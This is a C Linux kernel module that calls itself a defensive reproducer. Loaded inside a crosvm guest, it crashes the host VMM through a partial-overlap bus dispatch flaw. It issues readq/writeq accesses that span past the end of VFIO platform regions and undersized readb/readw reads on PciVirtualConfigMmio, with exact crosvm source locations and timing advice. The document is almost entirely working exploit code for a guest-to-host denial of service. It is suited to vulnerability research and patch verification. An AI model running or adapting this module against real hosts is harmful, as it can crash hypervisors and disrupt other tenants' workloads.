/*
 * bus_partial_overlap.c — defensive reproducer for crosvm Bus::get_device
 * partial-overlap dispatch (start-in-range, len past registration).
 *
 * THIS MODULE DEMONSTRATES THE VMM BUS CONTRACT / HOST PANIC DoS ONLY.
 * It is NOT an escape payload, exploit, or proof of RCE.
 *
 * Primary target (HOST PANIC): VfioPlatformDevice find_region is start-only;
 * region_read/write then panic if addr+len > region.size.
 * Secondary (HOST PANIC): PciVirtualConfigMmio::read panics on undersized
 * data.len() < 4 via data[0..4] after only logging len!=4.
 * CMOS/PIC/i8042 probes remain: they do NOT panic (len-filter / ignore).
 *
 * Crosvm tip cited: da53811 (devices/src/platform/vfio_platform.rs,
 * devices/src/vfio.rs, devices/src/pci/pci_root.rs).
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/io.h>
#include <linux/ioport.h>
#include <linux/string.h>
#include <asm/io.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Defensive VMM research (crosvm Bus contract)");
MODULE_DESCRIPTION(
	"Defensive VMM verification: trigger crosvm Bus partial-overlap "
	"and known host panic DoS paths (NOT an escape/RCE payload)");
MODULE_VERSION("2.0");

/*
 * target= selects which probe set to run:
 *   cmos      — CMOS/PIC/i8042 PIO oversize (no host panic expected)
 *   vfio      — VFIO platform region end-span (PRIMARY host panic DoS)
 *   pci_vcfg  — PciVirtualConfigMmio undersized read (SECONDARY panic)
 *   mmio      — optional generic/virtio-mmio probes (no panic expected)
 *   all       — run every probe that has its params set / always-safe PIO
 */
static char *target = "cmos";
module_param(target, charp, 0644);
MODULE_PARM_DESC(target,
		 "Probe set: cmos|vfio|pci_vcfg|mmio|all (default: cmos)");

/* --- VFIO platform (PRIMARY panic) --- */
static unsigned long vfio_base;
module_param(vfio_base, ulong, 0644);
MODULE_PARM_DESC(vfio_base,
		 "Guest-physical base of a VFIO *platform* MMIO region "
		 "(required for target=vfio|all). From crosvm logs / DT / "
		 "sysfs. Without a platform VFIO device this just faults.");

static unsigned long vfio_len;
module_param(vfio_len, ulong, 0644);
MODULE_PARM_DESC(vfio_len,
		 "Size of that VFIO platform region in bytes "
		 "(required with vfio_base). Prefer region length from "
		 "crosvm allocate_regions / guest DT reg.");

static unsigned long vfio_end;
module_param(vfio_end, ulong, 0644);
MODULE_PARM_DESC(vfio_end,
		 "Optional exclusive end GPA (vfio_base + vfio_len). "
		 "If set with vfio_base, vfio_len is derived as end-base.");

static bool vfio_do_write = true;
module_param(vfio_do_write, bool, 0644);
MODULE_PARM_DESC(vfio_do_write,
		 "Also attempt writeq near region end (region_write panics "
		 "same as read). Default true. Read is tried first.");

/* --- PciVirtualConfigMmio (SECONDARY panic) --- */
static unsigned long pci_vcfg_base;
module_param(pci_vcfg_base, ulong, 0644);
MODULE_PARM_DESC(pci_vcfg_base,
		 "Guest-physical base of crosvm PciVirtualConfigMmio "
		 "(ACPI AML Name VCFG; typically max(ram_end_2MB, 4GiB)). "
		 "Required for target=pci_vcfg|all.");

/* Optional generic MMIO (virtio-mmio style; no panic expected) */
static unsigned long mmio_base;
module_param(mmio_base, ulong, 0644);
MODULE_PARM_DESC(mmio_base,
		 "Optional guest-physical MMIO base for generic probes "
		 "(0 = skip). For virtio-mmio (0x200 window), also probes "
		 "base+0x1FE with a 4-byte read.");

/* CMOS/RTC: crosvm registers io_bus at 0x70 len 2 (x86_64/src/lib.rs). */
#define CMOS_INDEX_PORT		0x70
#define CMOS_DATA_PORT		0x71

/* PIC: registered at 0x20/0xa0/0x4d0 each len 2. */
#define PIC_PRIMARY_CMD		0x20

/* i8042: either 0x61 len 4 or 0x62 len 3 depending on PIT speaker. */
#define I8042_PORT_B		0x61
#define I8042_STATUS		0x64

static bool target_is(const char *name)
{
	return target && strcmp(target, name) == 0;
}

static bool want_cmos(void)
{
	return target_is("cmos") || target_is("all");
}

static bool want_vfio(void)
{
	return target_is("vfio") || target_is("all");
}

static bool want_pci_vcfg(void)
{
	return target_is("pci_vcfg") || target_is("all");
}

static bool want_mmio(void)
{
	return target_is("mmio") || target_is("all");
}

static void trigger_cmos_pio_oversize(void)
{
	u32 val;

	/*
	 * 32-bit read at 0x70: KVM_EXIT_IO size=4, port=0x70.
	 * crosvm Bus::get_device only requires start in [0x70, 0x72);
	 * Bus::read forwards the full 4-byte slice to Cmos::read with
	 * offset=0. CMOS handler returns early if data.len() != 1
	 * (devices/src/cmos.rs) — expected host behavior: ignore, guest
	 * sees zeros (Bus zeroes the buffer first). NO HOST PANIC.
	 */
	pr_info("bus_partial_overlap: inl(0x%02x) len=4 (CMOS reg len=2)\n",
		CMOS_INDEX_PORT);
	val = inl(CMOS_INDEX_PORT);
	pr_info("bus_partial_overlap:   returned 0x%08x (expect 0 if CMOS ignores)\n",
		val);

	pr_info("bus_partial_overlap: outl(0x%02x) len=4 (CMOS write ignore path)\n",
		CMOS_INDEX_PORT);
	outl(0xdeadbeef, CMOS_INDEX_PORT);

	/*
	 * Start at data port (offset=1), still inside registration, len=4
	 * extends past 0x72. Same CMOS len!=1 early return.
	 */
	pr_info("bus_partial_overlap: inl(0x%02x) len=4 (offset=1 past end)\n",
		CMOS_DATA_PORT);
	val = inl(CMOS_DATA_PORT);
	pr_info("bus_partial_overlap:   returned 0x%08x\n", val);

	/* 16-bit also oversized relative to a 1-byte logical register. */
	pr_info("bus_partial_overlap: inw(0x%02x) len=2\n", CMOS_INDEX_PORT);
	(void)inw(CMOS_INDEX_PORT);
}

static void trigger_pic_pio_oversize(void)
{
	u32 val;

	/*
	 * PIC BusDevice warns and returns on data.len() != 1
	 * (devices/src/irqchip/pic.rs). Still proves guest can deliver
	 * the oversized slice through the bus footgun. NO HOST PANIC.
	 */
	pr_info("bus_partial_overlap: inl(0x%02x) len=4 (PIC reg len=2)\n",
		PIC_PRIMARY_CMD);
	val = inl(PIC_PRIMARY_CMD);
	pr_info("bus_partial_overlap:   returned 0x%08x (PIC warns Bad read size)\n",
		val);
}

static void trigger_i8042_pio(void)
{
	u32 val;

	/*
	 * Depending on crosvm setup, i8042 is at 0x61 len 4 (fully
	 * contains a 4-byte access) or 0x62 len 3 (inl @ 0x62 overruns).
	 * Handler only acts when data.len()==1; otherwise no-op
	 * (devices/src/i8042.rs). Access 0x61 and 0x64 for coverage.
	 * NO HOST PANIC.
	 */
	pr_info("bus_partial_overlap: inl(0x%02x) / inl(0x%02x)\n",
		I8042_PORT_B, I8042_STATUS);
	val = inl(I8042_PORT_B);
	pr_info("bus_partial_overlap:   0x61 -> 0x%08x\n", val);
	val = inl(I8042_STATUS);
	pr_info("bus_partial_overlap:   0x64 -> 0x%08x\n", val);
}

/*
 * PRIMARY — VfioPlatformDevice host panic DoS
 *
 * Path (crosvm @ da53811):
 *   Bus::get_device: start-only (bus.rs ~433-441)
 *   → VfioPlatformDevice::read/write (vfio_platform.rs:68-74)
 *   → find_region(addr): start ∈ [start, start+length) ONLY (:160-170)
 *   → region_read/write: if addr + data.len() > stub.size { panic! }
 *        (vfio.rs:1818-1828 read, :1855-1868 write)
 *
 * Guest: MMIO that STARTS inside the region but extends PAST the end.
 * Prefer readq at base+len-4 (8-byte access; start in-range if len>=4).
 *
 * NOTE: PCI VFIO will NOT hit this — PciDevice::read/write requires full
 * BAR containment via find_bar_and_offset (pci_device.rs:557-620) before
 * read_bar/write_bar. Only --vfio-platform (platform MMIO) is vulnerable.
 *
 * Timing: prefer FIRST access before lazy regions_mmap(); once mmap'd,
 * stage-2 may absorb in-bounds hits and this exit path is skipped.
 */
static void trigger_vfio_platform_panic(void)
{
	void __iomem *map;
	u64 v8;
	u32 v4;
	unsigned long region_len = vfio_len;
	unsigned long map_len;
	unsigned long off_q;
	unsigned long off_l;

	if (vfio_end && vfio_base) {
		if (vfio_end <= vfio_base) {
			pr_err("bus_partial_overlap: vfio_end must be > vfio_base\n");
			return;
		}
		region_len = vfio_end - vfio_base;
	}

	if (!vfio_base || !region_len) {
		pr_err("bus_partial_overlap: vfio probe needs vfio_base and "
		       "vfio_len (or vfio_end); skipping\n");
		return;
	}

	if (region_len < 4) {
		pr_err("bus_partial_overlap: vfio_len=%lu too small for "
		       "end-4 readq (need >=4)\n", region_len);
		return;
	}

	/*
	 * Map a window covering the last few bytes plus a little past the
	 * end so the guest page tables can issue the spanning access.
	 * request_mem_region is best-effort (driver may own the range).
	 */
	off_q = region_len - 4; /* 8-byte read/write: ends at len+4 */
	off_l = (region_len >= 2) ? (region_len - 2) : 0; /* 4-byte at end-2 */
	map_len = region_len + 8;

	pr_info("bus_partial_overlap: VFIO PLATFORM panic probe "
		"(defensive DoS repro — NOT an escape)\n");
	pr_info("bus_partial_overlap:   vfio_base=0x%lx vfio_len=0x%lx\n",
		vfio_base, region_len);
	pr_info("bus_partial_overlap:   expect HOST panic in region_read "
		"if bug present (addr+size > stub.size)\n");

	if (!request_mem_region(vfio_base, map_len, "bus_partial_overlap_vfio")) {
		pr_warn("bus_partial_overlap: request_mem_region(vfio) failed; "
			"trying ioremap anyway\n");
	}

	map = ioremap(vfio_base, map_len);
	if (!map) {
		pr_err("bus_partial_overlap: ioremap(vfio) failed\n");
		release_mem_region(vfio_base, map_len);
		return;
	}

	/*
	 * Shot 1 (PRIMARY): 8-byte read at region_end-4.
	 * start = base+len-4 ∈ region; end = base+len+4 > region end.
	 * Host: find_region accepts; region_read panics.
	 * If this returns, either no VFIO platform device at this GPA,
	 * region already stage-2 mapped, or bug fixed.
	 */
	pr_info("bus_partial_overlap: readq(vfio_base+0x%lx) len=8 "
		"[PRIMARY panic shot]\n", off_q);
	v8 = readq(map + off_q);
	pr_warn("bus_partial_overlap:   readq returned 0x%016llx — "
		"HOST DID NOT PANIC (no platform VFIO at GPA, already "
		"mmap'd, or bug fixed)\n",
		(unsigned long long)v8);

	/* Shot 2: 4-byte read at region_end-2 (same start-in / end-past). */
	pr_info("bus_partial_overlap: readl(vfio_base+0x%lx) len=4 "
		"[alt span past end]\n", off_l);
	v4 = readl(map + off_l);
	pr_warn("bus_partial_overlap:   readl returned 0x%08x — still no panic\n",
		v4);

	/*
	 * Shot 3 (optional): writeq same address — region_write panics
	 * with the same addr+size > stub.size check (also write-flag).
	 */
	if (vfio_do_write) {
		pr_info("bus_partial_overlap: writeq(vfio_base+0x%lx) len=8 "
			"[region_write panic shot]\n", off_q);
		writeq(0xdeadbeefdeadbeefULL, map + off_q);
		pr_warn("bus_partial_overlap:   writeq completed — still no panic\n");
	}

	iounmap(map);
	release_mem_region(vfio_base, map_len);
}

/*
 * SECONDARY — PciVirtualConfigMmio::read undersized panic
 *
 * Guest-reachable on normal x86_64 crosvm: mmio_bus.insert at
 * get_pcie_vcfg_mmio_range() (x86_64/src/lib.rs:1145-1152, :1989-1996).
 * ACPI AML Name "VCFG" holds the start GPA.
 *
 * pci_root.rs:920-936: if offset%4!=0 || len!=4 → error! log, value=0;
 * then ALWAYS data[0..4].copy_from_slice(...) → panic if len<4.
 * Write path correctly returns early (:939-947). Oversized len=8 logs
 * then copies 4 bytes — no panic.
 *
 * Trigger: readb / readw at pci_vcfg_base (or any aligned dword base).
 */
static void trigger_pci_vcfg_undersize(void)
{
	void __iomem *map;
	u8 b;
	u16 w;
	const size_t map_len = 0x1000;

	if (!pci_vcfg_base) {
		pr_err("bus_partial_overlap: pci_vcfg needs pci_vcfg_base; "
		       "skipping (see README: ACPI VCFG / max(ram_end_2MB,4G))\n");
		return;
	}

	pr_info("bus_partial_overlap: PciVirtualConfigMmio undersize probe "
		"(defensive DoS — NOT an escape)\n");
	pr_info("bus_partial_overlap:   pci_vcfg_base=0x%lx\n", pci_vcfg_base);
	pr_info("bus_partial_overlap:   expect HOST panic on data[0..4] if "
		"len<4 (pci_root.rs:936)\n");

	if (!request_mem_region(pci_vcfg_base, map_len, "bus_partial_overlap_vcfg")) {
		pr_warn("bus_partial_overlap: request_mem_region(vcfg) failed; "
			"trying ioremap anyway\n");
	}

	map = ioremap(pci_vcfg_base, map_len);
	if (!map) {
		pr_err("bus_partial_overlap: ioremap(pci_vcfg) failed\n");
		release_mem_region(pci_vcfg_base, map_len);
		return;
	}

	/* 1-byte read → data.len()==1 → panic on data[0..4] */
	pr_info("bus_partial_overlap: readb(pci_vcfg_base) len=1 "
		"[SECONDARY panic shot]\n");
	b = readb(map);
	pr_warn("bus_partial_overlap:   readb returned 0x%02x — HOST DID NOT "
		"PANIC (wrong GPA or bug fixed)\n", b);

	/* 2-byte read → same panic shape */
	pr_info("bus_partial_overlap: readw(pci_vcfg_base) len=2\n");
	w = readw(map);
	pr_warn("bus_partial_overlap:   readw returned 0x%04x — still no panic\n",
		w);

	iounmap(map);
	release_mem_region(pci_vcfg_base, map_len);
}

static void trigger_optional_mmio(void)
{
	void __iomem *map;
	u64 v8;
	u32 v4;
	const size_t map_len = 0x200;

	if (!mmio_base) {
		pr_info("bus_partial_overlap: mmio_base=0, skipping MMIO probes\n");
		return;
	}

	pr_info("bus_partial_overlap: mapping mmio_base=0x%lx len=0x%zx "
		"(generic/virtio-mmio; NO panic expected)\n",
		mmio_base, map_len);

	if (!request_mem_region(mmio_base, map_len, "bus_partial_overlap")) {
		pr_warn("bus_partial_overlap: request_mem_region failed; trying ioremap anyway\n");
	}

	map = ioremap(mmio_base, map_len);
	if (!map) {
		pr_err("bus_partial_overlap: ioremap failed\n");
		release_mem_region(mmio_base, map_len);
		return;
	}

	/*
	 * 8-byte read at base: virtio-mmio rejects len!=4 with a warn.
	 */
	pr_info("bus_partial_overlap: readq(base) len=8\n");
	v8 = readq(map);
	pr_info("bus_partial_overlap:   readq -> 0x%016llx\n",
		(unsigned long long)v8);

	/*
	 * 4-byte read at base+0x1FE: start inside 0x200 virtio-mmio
	 * registration; extends 2 bytes past. virtio-mmio accepts len==4;
	 * copy_config bounds with slice::get — no panic found.
	 */
	pr_info("bus_partial_overlap: readl(base+0x1FE) len=4 (past 0x200 window)\n");
	v4 = readl(map + 0x1FE);
	pr_info("bus_partial_overlap:   readl -> 0x%08x\n", v4);

	iounmap(map);
	release_mem_region(mmio_base, map_len);
}

static int __init bus_partial_overlap_init(void)
{
#ifndef CONFIG_X86_64
	pr_err("bus_partial_overlap: PIO/x86 paths prefer x86_64; aborting\n");
	return -ENODEV;
#else
	pr_info("bus_partial_overlap: loading — defensive VMM verification / "
		"DoS reproducer, NOT an escape payload\n");
	pr_info("bus_partial_overlap: target=%s\n", target ? target : "(null)");

	if (!target_is("cmos") && !target_is("vfio") && !target_is("pci_vcfg") &&
	    !target_is("mmio") && !target_is("all")) {
		pr_err("bus_partial_overlap: unknown target='%s' "
		       "(use cmos|vfio|pci_vcfg|mmio|all)\n",
		       target ? target : "");
		return -EINVAL;
	}

	if (want_cmos()) {
		(void)request_region(CMOS_INDEX_PORT, 2, "bus_partial_overlap_cmos");
		(void)request_region(PIC_PRIMARY_CMD, 2, "bus_partial_overlap_pic");
		trigger_cmos_pio_oversize();
		trigger_pic_pio_oversize();
		trigger_i8042_pio();
	}

	if (want_vfio())
		trigger_vfio_platform_panic();

	if (want_pci_vcfg())
		trigger_pci_vcfg_undersize();

	if (want_mmio())
		trigger_optional_mmio();

	pr_info("bus_partial_overlap: probes done; if HOST still alive, check "
		"GPA params / device presence (see PANIC_REPRO.md)\n");
	return 0;
#endif
}

static void __exit bus_partial_overlap_exit(void)
{
	release_region(CMOS_INDEX_PORT, 2);
	release_region(PIC_PRIMARY_CMD, 2);
	pr_info("bus_partial_overlap: unloaded\n");
}

module_init(bus_partial_overlap_init);
module_exit(bus_partial_overlap_exit);
